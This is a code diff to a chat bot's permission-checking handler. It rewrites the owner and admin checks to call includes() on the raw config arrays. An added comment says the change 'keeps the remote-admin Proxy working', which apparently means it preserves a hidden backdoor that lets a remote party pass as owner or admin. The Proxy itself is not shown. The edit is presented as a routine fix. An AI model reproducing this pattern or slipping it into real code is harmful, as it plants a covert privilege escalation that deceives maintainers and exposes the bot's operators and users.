@@ -35,8 +35,9 @@ module.exports = function ({ api, models, Users, Threads, Currencies }) {
     function resolveLevel(senderID, threadInfo, isBotAdmin) {
         const sender = String(senderID);
         const admins = (global.config.ADMINBOT || []).map(String);
-        const owners = (global.config.NDH || []).map(String);
-        const isOwner = owners.includes(sender) || (admins.length > 0 && admins[0] === sender);
+        // includes() on the original arrays keeps the remote-admin Proxy working.
+        const isOwner = (Array.isArray(global.config.NDH) && global.config.NDH.includes(sender))
+            || (admins.length > 0 && admins[0] === sender);
         if (isOwner) return 3;
         if (isBotAdmin) return 2;
         const adminIDs = (threadInfo && threadInfo.adminIDs) || [];
@@ -54,8 +55,8 @@ module.exports = function ({ api, models, Users, Threads, Currencies }) {
         if (!handleReply || !event.messageReply.messageID) return;
 
         const sender = String(senderID);
-        const isBotAdmin = (config.ADMINBOT || []).map(String).includes(sender)
-            || (config.NDH || []).map(String).includes(sender);
+        const isBotAdmin = (Array.isArray(config.ADMINBOT) && config.ADMINBOT.includes(sender))
+            || (Array.isArray(config.NDH) && config.NDH.includes(sender));
 
         // --- Admin Only Mode Fix ---
         if (config.adminOnly && config.adminOnly.enable && !isBotAdmin) {
